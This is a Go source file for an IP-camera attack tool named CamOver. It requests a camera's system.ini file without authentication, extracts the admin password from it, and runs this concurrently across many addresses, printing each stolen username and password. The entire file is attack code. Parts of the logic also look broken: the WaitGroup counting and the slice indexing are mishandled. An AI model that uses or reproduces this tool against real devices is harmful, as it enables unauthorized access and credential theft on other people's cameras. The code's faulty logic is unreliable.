package pkg

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
	"sync"
)

type CamOver struct {
	username string
}

type CamOverCli struct {
	CamOver     CamOver
	threadDelay float64
}

type CamAccount struct {
	username string
	password string
}

func (c *CamOver) Exploit(address string) (*CamAccount, error) {
	c.username = "admin"

	transport := http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
		},
	}

	client := &http.Client{
		Transport: &transport,
	}

	target := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)

	request, err := http.NewRequest(http.MethodGet, target, nil)
	if err != nil {
		return nil, err
	}

	resp, err := client.Do(request)

	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		account := &CamAccount{}

		re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)

		content, _ := ioutil.ReadAll(resp.Body)

		patternString := re.FindAllSubmatch([]byte(content), -1)

		for index, val := range patternString {
			if strings.Contains(string(val[index]), c.username) {
				account.username = "admin"
				userIndex := strings.Index(string(val[index]), account.username)
				account.password = string(val[userIndex+1])

				return account, nil
			} else {
				continue
			}
		}
	}

	return nil, err
}

func (c *CamOverCli) thread(address string) bool {
	account, err := c.CamOver.Exploit(address)
	if err != nil {
		return false
	}

	Success(fmt.Sprintf("username : %s - password : %s", account.username, account.password))

	return true
}

func (c *CamOverCli) crack(addresses []string) {
	var wg sync.WaitGroup

	for _, address := range addresses {
		wg.Add(3)
		defer wg.Done()

		go func(address string) {
			ok := c.thread(address)
			if ok {
				Process("")
			} else {
				Errorf("")
			}
		}(address)
	}

	wg.Wait()
}
